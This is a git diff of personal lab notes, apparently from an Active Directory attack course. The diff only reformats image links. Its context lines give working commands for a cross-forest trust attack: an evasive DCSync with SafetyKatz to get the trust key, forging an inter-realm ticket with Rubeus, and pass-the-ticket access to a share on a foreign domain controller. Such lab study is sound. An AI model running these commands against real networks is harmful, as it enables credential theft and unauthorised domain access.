@@ -20,28 +20,28 @@ Use the forged ticket
 
 Run DCSync against the external trusted domain to get the trust key
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\ecorp$" "exit"`
-![[assets/Pasted image 20260224043315.png]]
-![[assets/Pasted image 20260224043301.png]]
+![Pasted image 20260224043315](assets/Pasted%20image%2020260224043315.png)
+![Pasted image 20260224043301](assets/Pasted%20image%2020260224043301.png)
 
 
 Forge an inter-realm TGT
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt\DOLLARCORP.MONEYCORP.LOCAL /rc4:<trust_key> /sid:S-1-5-21... /ldap /user:Administrator /nowrap`
-![[assets/Pasted image 20260224043456.png]]
-![[assets/Pasted image 20260224043503.png]]
+![Pasted image 20260224043456](assets/Pasted%20image%2020260224043456.png)
+![Pasted image 20260224043503](assets/Pasted%20image%2020260224043503.png)
 
 
 Use the ticket with asktgs module
 `C:\AD\Tools\Rubeus.exe asktgs /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt /ticket:<forged_ticket>`
-![[assets/Pasted image 20260224043610.png]]
-![[assets/Pasted image 20260224043616.png]]
+![Pasted image 20260224043610](assets/Pasted%20image%2020260224043610.png)
+![Pasted image 20260224043616](assets/Pasted%20image%2020260224043616.png)
 
 
 access an explicitly shared resource
 `dir \\eurocorp-dc.eurocorp.localSharedwithDCorp\`
-![[assets/Pasted image 20260224043654.png]]
+![Pasted image 20260224043654](assets/Pasted%20image%2020260224043654.png)
 
 can't access other resources (like C drive)
-![[assets/Pasted image 20260224043717.png]]
+![Pasted image 20260224043717](assets/Pasted%20image%2020260224043717.png)
 
 
 **can only know if a resource is explicitly shared when trying to access it -- request the service ticket with asktgs module in Rubeus, then check if we can actually use it**
